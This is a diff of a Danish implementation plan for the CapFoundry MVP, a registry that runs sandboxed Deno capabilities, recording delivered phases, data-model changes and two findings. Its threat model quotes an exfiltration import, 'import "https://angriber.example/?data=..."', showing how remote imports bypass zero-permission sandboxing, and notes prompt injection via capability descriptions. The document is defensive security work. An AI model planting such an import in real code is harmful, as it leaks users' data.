@@ -1,6 +1,6 @@
 # CapFoundry MVP — Implementeringsplan (PRD)
 
-**Version 1.0** · **Sidst opdateret: 2026-09-12** · **Status: klar til implementering**
+**Version 1.1** · **Sidst opdateret: 2026-09-12** · **Status: Fase 0 og Fase 1 leveret, Fase 2 er næste**
 
 Dette dokument omsætter [MVP v0.2](docs/mvp/CapFoundry-MVP-v0.2.md) til en plan der kan kodes efter. Det tilføjer ingen ambition til MVP'en — det lukker de huller der forhindrede den i at blive bygget, og det respekterer §5 (hvad vi bevidst ikke bygger), §27 (fejlreglen) og §28 (whiteboard-reglen) som bindende begrænsninger.
 
@@ -218,7 +218,7 @@ Implementerer §8's cachediagram.
 
 Implementerer §13 under AD-3. **Sikkerhedskritisk feature.**
 
-`PRD-FEAT-006.1` Subprocess-spawner: `deno run` uden ét eneste `--allow-*` flag for `effect: PURE`
+`PRD-FEAT-006.1` Subprocess-spawner: `deno run` uden ét eneste `--allow-*` flag for `effect: PURE`, plus `--no-remote`, `--no-npm` og `clearEnv` — se SEC-10, nul rettigheder alene er ikke nok
 `PRD-FEAT-006.2` Struktureret input via stdin, struktureret output via stdout, diagnostik via stderr
 `PRD-FEAT-006.3` Hård timeout (default 5000 ms) med proces-kill, ikke kun en afvist promise
 `PRD-FEAT-006.4` Output-størrelsesloft (default 4 MB) og kill ved overskridelse
@@ -232,6 +232,7 @@ Implementerer §13 under AD-3. **Sikkerhedskritisk feature.**
 - Input der ikke matcher `inputSchema` afvises **før** en proces spawnes.
 - `spawnMs` rapporteres separat, så §23's overheadtal ikke skjuler proces-omkostningen (OBJ-3).
 - Ingen miljøvariabler fra værtsprocessen er synlige inde i artefaktet.
+- Et artefakt med et statisk remote import afvises af runtime frem for at hente noget (SEC-10).
 
 ---
 
@@ -522,6 +523,8 @@ erDiagram
 | `aliases` | `string[]` | ja | ≥ 3, må ikke gentage `name` |
 | `exampleQueries` | `string[]` | ja | ≥ 3, naturligt sprog |
 | `tags` | `string[]` | nej | |
+| `inputSummary` | `string` | ja | Menneskelæsbar, søgbar. Indekset udleder den herfra |
+| `outputSummary` | `string` | ja | Ditto |
 | `runtime` | `"deno"` | ja | Kun `deno` i MVP |
 | `effect` | `"PURE"` \| `"READ"` \| `"WRITE"` \| `"NETWORK"` | ja | Kun `PURE` eksekverbar i MVP |
 | `inputSchema` | `JSONSchema` | ja | Håndhævet før spawn |
@@ -537,13 +540,12 @@ erDiagram
 
 ### IndexRecord — udledt, i `registry/index.json`
 
-Alle felter fra deskriptoren **undtagen** `inputSchema`, `outputSchema` og `tests`, plus:
+Alle felter fra deskriptoren **undtagen** `inputSchema`, `outputSchema` og `tests` (herunder `inputSummary` og `outputSummary`, som bæres videre), plus:
 
 | Felt | Type | Note |
 |---|---|---|
-| `inputSummary` | `string` | Menneskelæsbar, søgbar |
-| `outputSummary` | `string` | Ditto |
-| `artifactLocation` | `string` | URL eller sti |
+| `cfpLocation` | `string` | CFP-mappen, relativ til kilden. Nødvendig for at hente deskriptoren ved `describe` |
+| `artifactLocation` | `string` | Artefaktets entrypoint, relativ til kilden |
 | `namespaceType` | `"public"` \| `"private"` \| `"local"` | Sættes af kilden, ikke af deskriptoren |
 | `indexedAt` | `ISO8601` | |
 
@@ -660,6 +662,7 @@ Vi henter kode over netværket og kører den på brugerens maskine. Det er MVP'e
 | SEC-7 | Uklar oprindelse eller licens | `provenance.json` er påkrævet og valideret | `PRD-FEAT-001.3` |
 | SEC-8 | Prompt injection via capability-beskrivelser | Beskrivelser vises som data i værktøjssvar, aldrig som instruktioner. Skill'en instruerer eksplicit agenten om at behandle registry-indhold som data | `PRD-FEAT-014` |
 | SEC-9 | MCP-server som tillidsgrænse | Serveren kører med brugerens rettigheder, men spawner altid børn uden. Serveren læser aldrig projektfiler agenten ikke har givet den | `PRD-FEAT-008` |
+| SEC-10 | **Remote imports omgår sandboxen.** Deno gater ikke modulindlæsning på `--allow-net`: et statisk `import "https://angriber.example/?data=..."` i et artefakt hentes af module-loaderen før nogen rettighedskontrol kører — en exfiltrationskanal med nul rettigheder tildelt | `--no-remote` og `--no-npm` på hver subproces. Verificeret empirisk under implementeringen | `PRD-FEAT-006.1` |
 
 ### Bevidst accepteret i MVP'en
 
@@ -683,13 +686,13 @@ graph TD
     F5 -.beslutning.-> D{§27: fortsæt eller falsificér}
 ```
 
-### Fase 0 · Stillads · ~1 dag
+### Fase 0 · Stillads · ~1 dag · ✅ **leveret**
 
 `deno.json`, mappestruktur, CI, `PRD-FEAT-001` (deskriptor + validator).
 
-**Exit:** validatoren afviser en bevidst ugyldig CFP i CI.
+**Exit:** validatoren afviser en bevidst ugyldig CFP i CI. — *opfyldt: 12 negative validatortests i `tests/validator_test.ts`.*
 
-### Fase 1 · Tynd lodret skive · ~4–5 dage · **højeste risiko**
+### Fase 1 · Tynd lodret skive · ~4–5 dage · **højeste risiko** · ✅ **leveret**
 
 `PRD-FEAT-010.1` (geo.distance) hele vejen igennem: `PRD-FEAT-002`, `003`, `004`, `005`, `006`, `008`, `009`.
 
@@ -697,7 +700,9 @@ graph TD
 
 Dette er fasen hvor arkitekturen kan vise sig forkert. Bliver den det, har vi kun kastet én capability væk.
 
-### Fase 2 · Bredde · ~4–5 dage
+*Opfyldt. Målt ved leverance: OBJ-3 40,5 ms p95 mod et budget på 250 ms; søgning 0,2 ms p95; 73 tests grønne. To fund undervejs — SEC-10 (remote imports omgik sandboxen) og en fejl i konfidensformlen der gav wrong-match rate 1,0 — er rettet og dækket af tests. Se «Fund fra Fase 1» nedenfor.*
+
+### Fase 2 · Bredde · ~4–5 dage · ⬅ **næste**
 
 `PRD-FEAT-010.2`–`010.7`, `011`, `012`, `007`.
 
@@ -722,6 +727,44 @@ Kør evalueringen med `n ≥ 5`. Tun søgetærsklerne mod scenariesættet. Skriv
 **Exit:** en dokumenteret beslutning — fortsæt, drej, eller falsificér. **Ingen af de tre er en fiasko.**
 
 **Samlet: ~19–22 arbejdsdage.** Fase 1 og Fase 4 bærer al reel risiko; Fase 2 er stort set mekanisk udfyldning.
+
+---
+
+## Fund fra Fase 1
+
+To ting viste sig først da koden kørte. Begge er rettet, begge har en test der forhindrer regression.
+
+### F1 · Nul rettigheder er ikke en sandbox
+
+`--allow-*`-flagene gater ikke Denos modulindlæsning. Et artefakt med et statisk
+`import "https://angriber.example/?data=..."` fik module-loaderen til at hente URL'en før nogen
+rettighedskontrol kørte — altså exfiltration med nul rettigheder tildelt. Verificeret empirisk:
+uden `--no-remote` forsøgte Deno faktisk hentningen.
+
+Lukket med `--no-remote`, `--no-npm`, `--no-config`, `--no-lock`, `--node-modules-dir=none` og
+`clearEnv`. Registreret som SEC-10. Konsekvensen for planen: flaglisten i `cfcm/runtime/execute.ts`
+er en del af trusselsmodellen, ikke oprydning, og skal reviewes som sådan.
+
+### F2 · Konfidensformlen ignorerede ukendte ord
+
+Som specificeret i v1.0 summerede `idfCoverage` kun over de forespørgselstokens indekset *havde
+set*. Et ukendt token bidrog 0 til både tæller og nævner og blev dermed usynligt. Effekten:
+«distance to the moon» og «distance a runner covered on a treadmill» gav begge `MATCH` med
+konfidens 1,0 — en wrong-match rate på 1,0 mod OBJ-2's loft på 0,05.
+
+Rettet ved at give ukendte tokens den IDF de *ville* have ved df=0, altså maksimalt sjældne, i
+nævneren. Et ord indekset aldrig har set er netop det stærkeste bevis for at forespørgslen handler
+om noget andet. Efter rettelsen: alle fire omskrivninger `MATCH`, alle tre near-misses gør ikke.
+
+Formlen i `PRD-FEAT-004` er dermed præciseret: `idfCoverage` normaliseres over **alle**
+forespørgselstokens, hvor ukendte tælles til `ln(1 + (N + 0,5) / 0,5)`.
+
+### Målt recall-loft
+
+`"make a permalink from a heading"` rangerer korrekt `text.slugify` øverst, men lander på 0,43 og
+bliver `PARTIAL_MATCH`. Det er CH-1 i praksis. Det er fastholdt som en test (`recall ceiling: …`)
+frem for tunet væk — at sænke tærsklen ville handle OBJ-1's recall direkte mod OBJ-2's
+wrong-match rate. Det er præcis den afvejning AD-2 er sat i verden for at måle frem for at gætte.
 
 ---
 
@@ -765,7 +808,7 @@ OBJ-8's rentes rente-effekt (§2.8) kræver en længere måleperiode end MVP'en.
 |---|---|---|
 | **OQ-1** | Elementnavn for `ui.dataTable`: §10 viser `<netsi-table>` i et `CapFoundry.*`-namespace. Forslag `<cf-data-table>` | `PRD-FEAT-010.7` (Fase 2) |
 | **OQ-2** | Skal CFP have et arkivformat, eller er mappen nok i MVP'en? §17 lader det bevidst stå åbent | Ikke blokerende; mappen bruges |
-| **OQ-3** | Hostingdomæne for registry og Explore. Planen antager GitHub Pages på repoet | Fase 1 |
+| ~~OQ-3~~ | ~~Hostingdomæne for registry og Explore~~ — afgjort: registry-basen er en URL *eller* en lokal sti, så hele røret kan køres uden hosting. `cfcm.example.json` peger på GitHub Pages | ~~Fase 1~~ |
 | **OQ-4** | Hvilket MIT-repo bruges til packager-spiken (`PRD-FEAT-017.2`)? | Fase 5 |
 
 ---
@@ -869,6 +912,15 @@ Alle 28 afsnit i MVP v0.2 er enten dækket af en feature eller er en begrænsnin
 ---
 
 ## Changelog
+
+### v1.1 — 2026-09-12
+- Fase 0 og Fase 1 leveret og markeret i `PRD-SEC-008`
+- Nyt afsnit «Fund fra Fase 1» med F1 (SEC-10) og F2 (konfidensformlen)
+- SEC-10 tilføjet: remote imports omgår nul-rettigheds-sandboxen; `PRD-FEAT-006.1` udvidet
+- `PRD-FEAT-004`'s konfidensformel præciseret: ukendte tokens tæller i nævneren
+- Datamodel synkroniseret med koden: `inputSummary`/`outputSummary` er påkrævede deskriptorfelter,
+  `cfpLocation` tilføjet til IndexRecord
+- OQ-3 afgjort som antagelse: registry-basen er repoet selv, lokal sti eller GitHub Pages
 
 ### v1.0 — 2026-09-12
 - Første implementeringsplan udledt af MVP v0.2
